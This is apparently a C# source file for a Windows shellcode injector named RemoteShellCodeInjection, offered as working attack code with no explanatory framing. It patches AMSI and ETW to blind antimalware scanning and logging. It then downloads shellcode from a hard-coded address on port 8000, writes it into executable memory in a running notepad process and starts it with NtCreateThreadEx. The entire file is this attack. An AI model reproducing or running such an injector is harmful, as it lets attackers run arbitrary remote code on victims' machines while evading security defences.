using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Text;
using System.Threading;
namespace RemoteShellCodeInjection
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, uint zeroBits, ref UIntPtr regionSize, uint allocationType, uint protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, UIntPtr numberOfBytesToWrite, out UIntPtr numberOfBytesWritten);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtReadVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, UIntPtr numberOfBytesToRead, out UIntPtr numberOfBytesRead);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startRoutine, IntPtr argument, uint createFlags, uint zeroBits, uint stackSize, uint maximumStackSize, IntPtr attributeList);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtProtectVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref UIntPtr regionSize, uint newProtect, out uint oldProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtFreeVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref UIntPtr regionSize, uint freeType);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtClose(IntPtr handle);
        static void Main(string[] args)
        {
            // Get the process handle for the target process
            Process targetProcess = Process.GetProcessesByName("notepad").FirstOrDefault();
            IntPtr hProc = targetProcess.Handle;

            // Patch AMSI
            IntPtr amsiAddr = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer");
            byte[] amsiPatch = { 0x31, 0xC0, 0x05, 0x4E, 0xFE, 0xFD, 0x7D, 0x05, 0x09, 0x02, 0x09, 0x02, 0xC3 };
            uint lpflOldProtect = 0;
            UIntPtr memPage = (UIntPtr)0x1000;
            IntPtr amsiAddr_bk = amsiAddr;
            NtProtectVirtualMemory(hProc, ref amsiAddr_bk, ref memPage, 0x04, out lpflOldProtect);
            NtWriteVirtualMemory(hProc, amsiAddr, amsiPatch, (UIntPtr)amsiPatch.Length, out UIntPtr _);
            NtProtectVirtualMemory(hProc, ref amsiAddr_bk, ref memPage, lpflOldProtect, out _);

            // Patch ETW
            IntPtr etwAddr = GetProcAddress(LoadLibrary("ntdll.dll"), "EtwEventWrite");
            byte[] etwPatch = { 0xC3 };
            IntPtr etwAddr_bk = etwAddr;
            NtProtectVirtualMemory(hProc, ref etwAddr_bk, ref memPage, 0x04, out lpflOldProtect);
            NtWriteVirtualMemory(hProc, etwAddr, etwPatch, (UIntPtr)etwPatch.Length, out _);
            NtProtectVirtualMemory(hProc, ref etwAddr_bk, ref memPage, lpflOldProtect, out _);

            // Download the remote shellcode
            HttpClient client = new();
            byte[] assemblyBytes;
            string shellString = client.GetStringAsync("http://192.168.239.128:8000/shellcode.txt").Result;


            assemblyBytes = shellString.Split(',').Select(s => Byte.Parse(s.Substring(2), NumberStyles.HexNumber)).ToArray();
            // Allocate memory in the target process for the remote assembly
            IntPtr remoteAssembly = IntPtr.Zero;
            UIntPtr remoteAssemblySize = (UIntPtr)1024;
            NtAllocateVirtualMemory(hProc, ref remoteAssembly, 0, ref remoteAssemblySize, 0x1000, 0x40);

            // Write the remote assembly to the allocated memory in the target process
            NtWriteVirtualMemory(hProc, remoteAssembly, assemblyBytes, (UIntPtr)assemblyBytes.Length, out _);

            // Create a remote thread in the target process to execute the remote assembly
            IntPtr hThread = IntPtr.Zero;
            NtCreateThreadEx(out hThread, 0x1FFFFF, IntPtr.Zero, hProc, remoteAssembly, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero);
            // Wait for the remote thread to finish execution
            WaitForSingleObject(hThread, 0xFFFFFFFF);

            // Read the output of the remote assembly from the target process
            byte[] outputBuffer = new byte[1024];
            UIntPtr outputBufferSize = (UIntPtr)outputBuffer.Length;
            NtReadVirtualMemory(hProc, remoteAssembly, outputBuffer, outputBufferSize, out _);

            // Print the output of the remote assembly
            Console.WriteLine(Encoding.UTF8.GetString(outputBuffer));

            // Clean up
            NtFreeVirtualMemory(hProc, ref remoteAssembly, ref remoteAssemblySize, 0x8000);
            NtClose(hThread);
        }
    }
}